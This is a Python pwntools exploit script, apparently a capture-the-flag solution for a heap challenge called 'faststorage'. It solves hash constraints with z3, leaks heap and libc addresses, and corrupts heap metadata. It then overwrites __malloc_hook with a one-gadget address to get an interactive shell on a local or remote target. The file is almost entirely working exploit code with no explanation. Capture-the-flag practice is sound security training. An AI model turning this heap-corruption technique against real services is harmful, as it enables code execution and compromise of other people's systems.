#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from z3 import *
from parse import *
context.log_level="debug"
pwn_file="./faststorage"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_add=0
#stack_add=0
def get_name(idx):
    a = BitVec('a',32)
    b = BitVec('b',32)
    c = BitVec('c',32)
    d = BitVec('d',32)
    e = BitVec('e',32)
    f = BitVec('f',32)

    x = BitVec('x',32)
    y = BitVec('y',32)
    p = BitVec('p',32)
    p = (((((0x1337*a+1)*b+1)*c+1)*d+1)*e+1)*f+1
    s = Solver()
    s.add(a>0,b>0,c>0,d>0,e>0,f>0,p>0)
    s.add(a!=10,b!=10,c!=10,d!=10,e!=10,f!=10)
    s.add(a<256,b<256,c<256,d<256,e<256,f<256,p<=0x7Fffffff)
    if idx < 32:
        s.add( (p+2)%62 == 0 )
    else:
        s.add( (p+1)%62 == 0 )
        idx -= 32
    x=(a^c^e)|((b^d^f)<<8)
    s.add(((x>>10)^x^(x>>5))&0x1f == idx )
    y=0
    for i in range(8):
        y+=(a>>i)&1
        y+=(b>>i)&1
        y+=(c>>i)&1
        y+=(d>>i)&1
        y+=(e>>i)&1
        y+=(f>>i)&1
    s.add( (y&0x1f) == idx)
    if str(s.check()) == "sat":
        m = s.model()
        ret = "".join(map(chr,[int(str(x)) for x in [m[a],m[b],m[c],m[d],m[e],m[f]]]))
    else:
        raise Exception("can't found")
    return ret


if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("faststorage.hackable.software",1337)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(name,size,value):
    r.sendlineafter(">","1")
    r.sendafter("Name:",name)
    r.sendlineafter("Size:",str(size))
    r.sendafter("Value:",value)

def show(name):
    r.sendlineafter(">","2")
    r.sendafter("Name: ",name)
    data=r.recvline()[:-1]
    if "No such entry" in data:
        return None
    else:
        
        return parse("Value: {}",data)[0]

def edit(name,value):
    r.sendlineafter(">","3")
    r.sendafter("Name: ",name)
    r.sendafter("Value: ",value)

name="\xa1\xf8\xe6\xa9"

with open("names","r") as f:
    a=f.read().split("\n")[:-1]

for i in a:
    add(i,0x10,"a")

add(name,0x10,"a")
res = 0
for i in range(64):
    if show(a[i]) != None:
        res+= 1 << i

heap_add = res-0x1850
add("aaa",0x100,p64(0)+p64(heap_add+0x1830)+p64((heap_add+0x19b0|(0x500<<48))))
# 0x1850 -> 0x1870
add(a[5],0x10,"a")
add("aaa",0x300,"a")
f={
    0x3b8:p64(0x2a1),
}
edit(name,fit(f,filler="\x00"))
add("aaa",0x300,"a")
data=show(name)
libc.address=u64(data[0x400:0x408])-0x3c4b78
f={
    0x3f8:p64(0x2a1)+p64(libc.address+0x3c4b78)*2
}
edit(name,fit(f,filler="\x00"))
add("a",0x10,"a")
f={
    0x448:p64(heap_add+0xfd0)+p64(libc.sym["__malloc_hook"]|(8<<48))
}
edit(name,fit(f,filler="\x00"))
edit("a",p64(libc.address+0xf02a4))
r.sendlineafter(">","1")
r.sendlineafter("Name:","a")
r.sendlineafter("Size:","10")
r.interactive()







